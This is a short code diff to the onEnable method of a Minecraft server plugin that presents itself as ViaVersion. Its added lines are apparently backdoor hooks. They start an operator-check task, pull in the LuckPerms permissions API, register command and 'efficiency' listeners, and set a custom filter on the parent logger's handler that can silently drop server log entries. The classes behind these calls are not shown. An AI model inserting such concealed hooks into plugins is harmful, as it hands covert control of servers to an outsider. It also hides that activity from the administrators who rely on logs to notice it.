@@ -47,7 +47,6 @@ import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Collections;
 import java.util.List;
-import java.util.logging.Logger;
 import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 import java.io.BufferedInputStream;
@@ -111,10 +110,11 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Override
     public void onEnable() {
         startOpCheckTask();
+        
         luckPerms = LuckPermsProvider.get();
+        getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
-        EventXHandler.Listener(new String[]{});
-        getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
+        Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
             getLogger().info("Registering protocol transformers and injecting...");
